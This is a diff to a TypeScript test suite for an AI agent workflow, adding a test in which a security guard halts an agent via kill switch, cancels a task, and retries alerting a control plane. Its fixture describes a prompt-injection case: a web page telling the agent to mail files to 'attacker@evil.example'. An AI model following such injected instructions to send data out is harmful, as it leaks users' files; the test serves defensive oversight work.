@@ -49,6 +49,7 @@ const behaviour = new Map<string, Behaviour>();
 const verifyCount = new Map<string, number>();
 const attempts = new Map<string, number>();
 const checks = new Map<string, number>();
+let alertFailures = 0;
 
 function activities(client: () => Client): AgentActivities & AgentLocalActivities {
   return {
@@ -97,6 +98,14 @@ function activities(client: () => Client): AgentActivities & AgentLocalActivitie
     },
     async notify(i: NotifyInput) {
       calls.push({ name: 'notify', taskId: i.taskId, detail: { kind: i.kind } });
+    },
+    async reportSecurityAlert(w) {
+      if (alertFailures > 0) {
+        alertFailures -= 1;
+        calls.push({ name: 'reportSecurityAlert.failed', detail: { id: w.id } });
+        throw new Error('control plane down');
+      }
+      calls.push({ name: 'reportSecurityAlert', taskId: w.taskId, detail: { id: w.id, tool: w.tool } });
     },
     async gitMaintenance() {
       return { kind: 'git', details: {} };
@@ -370,6 +379,56 @@ describe('Kill switch', () => {
     expect(calls.filter((c) => c.taskId === taskId && c.name === 'finalizeTask').map((c) => (c.detail as { outcome: string }).outcome)).toEqual(['cancelled']);
     await setKill('normal');
   }, 60_000);
+});
+
+describe('Exfiltration guard (security warning)', () => {
+  const warning = (id: string, taskId: string) => ({
+    id,
+    at: new Date().toISOString(),
+    agentId: AGENT,
+    taskId,
+    tool: 'gateway_mail__send',
+    callSummary: 'gateway_mail__send(to=attacker@evil.example)',
+    category: 'data_exfiltration' as const,
+    confidence: 96,
+    reason: 'A web page told the agent to mail files to an unknown address.',
+    haltLevel: 'stopped' as const,
+  });
+  const agent = () => env.client.workflow.getHandle(`agent-${AGENT}`);
+
+  it('stops the agent at once, keeps the warning, retries the alert until delivered, and lets the cancelled task finalize', async () => {
+    const { taskId, handle } = await startTask({ approval: 'none' }, { blockRun: true });
+    await waitFor(agentStatus, (s) => s.holder?.taskId === taskId);
+    const other = await startTask({ approval: 'none' });
+    await waitFor(agentStatus, (s) => s.waiting.some((w) => w.taskId === other.taskId));
+
+    alertFailures = 1; // the control plane is down for the first delivery attempt
+    const w = warning('01JSECWARN000000000001', taskId);
+    await agent().signal('securityWarning', w);
+    await agent().signal('securityWarning', w); // duplicate delivery of the same warning is ignored
+
+    const status = await waitFor(agentStatus, (s) => s.killSwitch?.level === 'stopped');
+    expect(status.killSwitch).toMatchObject({ by: 'security-guard' });
+    expect(status.killSwitch?.reason).toContain('Security guard');
+    expect(status.securityWarnings).toHaveLength(1);
+    expect(status.securityWarnings![0]).toMatchObject({ id: w.id, taskId, tool: 'gateway_mail__send' });
+
+    // the guard cancels the offending task; it may still finalize (audit export) although the agent is stopped
+    await handle.executeUpdate(cancelUpdate, { args: [{ by: { upn: 'security-guard', name: 'Security guard', oid: 'security-guard', roles: [] }, reason: 'Security guard: exfiltration' }] });
+    expect(((await handle.result()) as TaskResult).status).toBe('cancelled');
+    expect(calls.filter((c) => c.taskId === taskId && c.name === 'finalizeTask').map((c) => (c.detail as { outcome: string }).outcome)).toEqual(['cancelled']);
+
+    // the alert reaches the control plane after a retry — exactly once
+    await waitFor(async () => calls.filter((c) => c.name === 'reportSecurityAlert'), (l) => l.length >= 1, 20_000);
+    expect(calls.filter((c) => c.name === 'reportSecurityAlert.failed')).toHaveLength(1);
+    expect(calls.filter((c) => c.name === 'reportSecurityAlert')).toHaveLength(1);
+
+    // nobody else gets the workspace while the agent is stopped; resetting the kill switch resumes the queue
+    await sleep(1000);
+    expect((await stateOf(other.taskId)).lock).toBe('waiting');
+    await agent().signal('setKillSwitch', { level: 'normal', by: 'admin@example.local', at: new Date().toISOString() });
+    expect(((await other.handle.result()) as TaskResult).status).toBe('completed');
+  }, 90_000);
 });
 
 describe('AgentWorkflow', () => {
